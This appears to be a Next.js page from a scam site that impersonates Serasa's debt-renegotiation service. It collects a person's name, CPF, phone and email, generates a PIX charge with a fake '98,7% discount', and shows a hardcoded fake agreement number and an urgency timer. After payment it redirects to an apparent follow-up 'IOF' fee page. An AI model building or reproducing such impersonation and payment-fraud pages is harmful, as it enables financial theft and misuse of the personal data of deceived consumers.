"use client"

import { useState, useEffect, Suspense, useRef } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import Image from "next/image"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Copy, CheckCircle, Clock, AlertCircle, Loader2 } from "lucide-react"

interface PixData {
  txid: string
  amount_cents: number
  pix: {
    copia_e_cola: string
    qr_code_base64: string
    expiration: string
  }
}

function LoadingFallback() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-pink-50 to-white">
      <header className="bg-pink-600 text-white p-4 shadow-lg">
        <div className="max-w-4xl mx-auto flex items-center gap-3">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
            alt=""
            width={120}
            height={40}
            className="h-8 w-auto"
          />
          <div className="flex-1">
            <h1 className="font-semibold text-lg">Pagamento PIX</h1>
            <p className="text-sm opacity-90">Feirão de Negociação</p>
          </div>
        </div>
      </header>
      <div className="max-w-lg mx-auto p-4 mt-8">
        <Card className="p-8 text-center bg-white shadow-xl border-0">
          <Loader2 className="w-16 h-16 text-pink-600 animate-spin mx-auto mb-6" />
          <h2 className="text-2xl font-semibold text-gray-800 mb-2">Gerando pagamento...</h2>
          <p className="text-gray-600">Aguarde enquanto preparamos seu PIX</p>
        </Card>
      </div>
    </div>
  )
}

function PagamentoContent() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const nome = searchParams.get("nome") || ""
  const cpf = searchParams.get("cpf") || ""
  const valor = searchParams.get("valor") || "78.47"
  const telefone = searchParams.get("telefone") || "11999999999"
  const email = searchParams.get("email") || ""

  const [pixData, setPixData] = useState<PixData | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<string>("PENDING")
  const [timeLeft, setTimeLeft] = useState<number>(3600)
  const isGeneratingRef = useRef(false)

  useEffect(() => {
    if (isGeneratingRef.current || !nome || !cpf) {
      if (!nome || !cpf) {
        setError("Dados do cliente nao encontrados")
        setIsLoading(false)
      }
      return
    }

    isGeneratingRef.current = true

    const generatePix = async () => {
      setIsLoading(true)
      setError(null)

      try {
        const amountCents = Math.round(parseFloat(valor.replace(",", ".")) * 100)

        const response = await fetch("/api/pix/create", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            amount_cents: amountCents,
            customer_name: nome,
            customer_document: cpf,
            customer_phone: telefone,
            customer_email: email || undefined,
            description: "pagamento seguro",
            external_id: `acordo-${cpf.replace(/\D/g, "")}-${Date.now()}`,
          }),
        })

        const data = await response.json()

        if (!data.success) {
          throw new Error(data.error || "Erro ao gerar PIX")
        }

        setPixData(data)
      } catch (err) {
        console.error("Error generating PIX:", err)
        setError(err instanceof Error ? err.message : "Erro ao gerar PIX")
        isGeneratingRef.current = false
      } finally {
        setIsLoading(false)
      }
    }

    generatePix()
  }, [nome, cpf, valor, telefone, email])

  useEffect(() => {
    if (!pixData?.txid) return

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix/status/${pixData.txid}`)
        const data = await response.json()
        
        if (data.success && data.status) {
          setPaymentStatus(data.status)
          if (data.status === "APPROVED") {
            router.push(`/iof?cpf=${cpf}&nome=${encodeURIComponent(nome)}&valor=${valor}`)
          }
        }
      } catch (err) {
        console.error("Error checking status:", err)
      }
    }

    const interval = setInterval(checkStatus, 5000)
    return () => clearInterval(interval)
  }, [pixData?.txid, cpf, nome, valor, router])

  useEffect(() => {
    if (paymentStatus !== "PENDING") return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [paymentStatus])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handleCopy = async () => {
    if (!pixData?.pix.copia_e_cola) return

    try {
      await navigator.clipboard.writeText(pixData.pix.copia_e_cola)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    } catch (err) {
      console.error("Error copying:", err)
    }
  }

  const formatCurrency = (cents: number) => {
    return (cents / 100).toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    })
  }

  if (paymentStatus === "APPROVED") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-green-50 to-white">
        <header className="bg-pink-600 text-white p-4 shadow-lg">
          <div className="max-w-4xl mx-auto flex items-center gap-3">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
              alt=""
              width={120}
              height={40}
              className="h-8 w-auto"
            />
            <div className="flex-1">
              <h1 className="font-semibold">Pagamento Confirmado</h1>
              <p className="text-sm opacity-90">Feirão de Negociação</p>
            </div>
          </div>
        </header>

        <div className="max-w-lg mx-auto p-4 mt-8">
          <Card className="p-8 text-center border-0 shadow-xl">
            <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
              <CheckCircle className="w-14 h-14 text-green-600" />
            </div>
            
            <h2 className="text-3xl font-bold text-gray-900 mb-2">Obrigado!</h2>
            <p className="text-xl text-green-600 font-semibold mb-4">Pagamento aprovado com sucesso</p>
            
            <div className="bg-green-50 rounded-xl p-6 border border-green-200 mb-6">
              <p className="text-gray-600 mb-4">
                Seu acordo foi confirmado e sua situação será regularizada em até 5 dias úteis.
              </p>
              <div className="space-y-3 text-left">
                <div className="flex justify-between items-center py-2 border-b border-green-200">
                  <span className="text-gray-600">Beneficiario:</span>
                  <span className="font-semibold text-gray-800">{nome}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-green-200">
                  <span className="text-gray-600">CPF:</span>
                  <span className="font-semibold text-gray-800">{cpf}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-green-200">
                  <span className="text-gray-600">Acordo:</span>
                  <span className="font-semibold text-gray-800">83N2L618362E</span>
                </div>
                <div className="flex justify-between items-center py-2">
                  <span className="text-gray-600">Valor pago:</span>
                  <span className="font-bold text-green-600 text-lg">{formatCurrency(pixData?.amount_cents || 200)}</span>
                </div>
              </div>
            </div>

            <div className="bg-blue-50 rounded-lg p-4 border border-blue-200 mb-6">
              <p className="text-sm text-blue-800">
                <strong>Importante:</strong> Guarde este comprovante. Voce recebera uma confirmacao por e-mail em ate 24 horas.
              </p>
            </div>

            <div className="text-center text-xs text-gray-500">
              <p>Transacao processada com seguranca</p>
              <p>Feirão de Negociação Oficial</p>
              <p className="mt-2">ID: {pixData?.txid}</p>
            </div>
          </Card>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-pink-50 to-white">
      <header className="bg-pink-600 text-white p-4 shadow-lg">
        <div className="max-w-4xl mx-auto flex items-center gap-3">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
            alt=""
            width={120}
            height={40}
            className="h-8 w-auto"
          />
          <div className="flex-1">
            <h1 className="font-semibold text-lg">Pagamento PIX</h1>
            <p className="text-sm opacity-90">Feirão de Negociação</p>
          </div>
          <div className="flex items-center gap-2 bg-white/20 rounded-full px-3 py-1">
            <Clock className="w-4 h-4" />
            <span className="text-sm font-medium">{formatTime(timeLeft)}</span>
          </div>
        </div>
      </header>

      <div className="max-w-lg mx-auto p-4 mt-4">
        {isLoading ? (
          <Card className="p-8 text-center bg-white shadow-xl border-0">
            <Loader2 className="w-16 h-16 text-pink-600 animate-spin mx-auto mb-6" />
            <h2 className="text-2xl font-semibold text-gray-800 mb-2">Gerando PIX...</h2>
            <p className="text-gray-600">Aguarde enquanto preparamos seu pagamento</p>
          </Card>
        ) : error ? (
          <Card className="p-8 text-center bg-white shadow-xl border-0">
            <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <AlertCircle className="w-10 h-10 text-red-600" />
            </div>
            <h2 className="text-2xl font-semibold text-gray-800 mb-2">Erro ao gerar PIX</h2>
            <p className="text-gray-600 mb-6">{error}</p>
            <Button onClick={() => { isGeneratingRef.current = false; window.location.reload() }} className="bg-pink-600 hover:bg-pink-700 text-white px-8 py-3 text-lg">
              Tentar novamente
            </Button>
          </Card>
        ) : pixData ? (
          <div className="space-y-4">
            <Card className="p-6 bg-white shadow-xl border-0">
              <div className="text-center mb-6">
                <div className="inline-flex items-center gap-2 bg-green-100 text-green-700 px-4 py-2 rounded-full text-sm font-medium mb-4">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  PIX gerado com sucesso
                </div>
                <h2 className="text-xl font-bold text-gray-800">Escaneie o QR Code para pagar</h2>
              </div>

              <div className="bg-gradient-to-br from-pink-50 to-pink-100 rounded-2xl p-6 mb-6">
                <div className="text-center mb-4">
                  <p className="text-sm text-gray-600 mb-1">Valor do acordo</p>
                  <p className="text-4xl font-bold text-pink-600">
                    {formatCurrency(pixData.amount_cents)}
                  </p>
                  <p className="text-xs text-green-600 font-medium mt-1">Desconto de 98,7% aplicado</p>
                </div>
              </div>

              <div className="flex justify-center mb-6">
                <div className="bg-white p-4 rounded-2xl border-2 border-pink-200 shadow-lg">
                  {pixData.pix.qr_code_base64 && (
                    <Image
                      src={pixData.pix.qr_code_base64}
                      alt="QR Code PIX"
                      width={220}
                      height={220}
                      className="w-52 h-52"
                    />
                  )}
                </div>
              </div>

              <div className="text-center mb-4">
                <p className="text-sm text-gray-500">
                  Ou copie o codigo abaixo e cole no seu banco
                </p>
              </div>

              <div className="bg-gray-100 rounded-xl p-4 mb-6">
                <p className="text-xs text-gray-500 mb-2 font-semibold uppercase tracking-wide">Codigo Copia e Cola</p>
                <div className="bg-white rounded-lg border border-gray-200 p-3 break-all text-xs text-gray-700 max-h-20 overflow-y-auto font-mono">
                  {pixData.pix.copia_e_cola}
                </div>
              </div>

              <Button
                onClick={handleCopy}
                className={`w-full py-6 text-lg font-semibold transition-all rounded-xl ${
                  copied
                    ? "bg-green-600 hover:bg-green-700"
                    : "bg-pink-600 hover:bg-pink-700"
                } text-white shadow-lg`}
              >
                {copied ? (
                  <>
                    <CheckCircle className="w-6 h-6 mr-2" />
                    Codigo copiado!
                  </>
                ) : (
                  <>
                    <Copy className="w-6 h-6 mr-2" />
                    Copiar codigo PIX
                  </>
                )}
              </Button>
            </Card>

            <Card className="p-5 bg-white shadow-lg border-0">
              <h3 className="font-bold text-gray-800 mb-4 text-lg">Dados do acordo</h3>
              <div className="space-y-3">
                <div className="flex justify-between items-center py-2 border-b border-gray-100">
                  <span className="text-gray-500">Beneficiario</span>
                  <span className="font-semibold text-gray-800">{nome}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-100">
                  <span className="text-gray-500">CPF</span>
                  <span className="font-semibold text-gray-800">{cpf}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-100">
                  <span className="text-gray-500">Acordo</span>
                  <span className="font-semibold text-gray-800">83N2L618362E</span>
                </div>
                <div className="flex justify-between items-center py-2">
                  <span className="text-gray-500">Status</span>
                  <span className="font-semibold text-yellow-600 flex items-center gap-2">
                    <div className="w-2.5 h-2.5 bg-yellow-500 rounded-full animate-pulse"></div>
                    Aguardando pagamento
                  </span>
                </div>
              </div>
            </Card>

            <Card className="p-5 bg-gray-100 border-0">
              <h3 className="font-bold text-gray-800 mb-3">Como pagar com PIX</h3>
              <ol className="text-sm text-gray-600 space-y-3">
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 bg-pink-600 text-white rounded-full flex items-center justify-center text-xs font-bold shrink-0">1</span>
                  <span>Abra o app do seu banco ou instituicao financeira</span>
                </li>
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 bg-pink-600 text-white rounded-full flex items-center justify-center text-xs font-bold shrink-0">2</span>
                  <span>Escolha pagar com PIX QR Code ou Copia e Cola</span>
                </li>
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 bg-pink-600 text-white rounded-full flex items-center justify-center text-xs font-bold shrink-0">3</span>
                  <span>Escaneie o QR Code ou cole o codigo copiado</span>
                </li>
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 bg-pink-600 text-white rounded-full flex items-center justify-center text-xs font-bold shrink-0">4</span>
                  <span>Confirme o pagamento e pronto!</span>
                </li>
              </ol>
            </Card>

            <div className="text-center text-xs text-gray-400 pb-6">
              <p className="font-medium">Pagamento processado com seguranca</p>
              <p>Feirão de Negociação Oficial</p>
            </div>
          </div>
        ) : null}
      </div>
    </div>
  )
}

export default function PagamentoPage() {
  return (
    <Suspense fallback={<LoadingFallback />}>
      <PagamentoContent />
    </Suspense>
  )
}
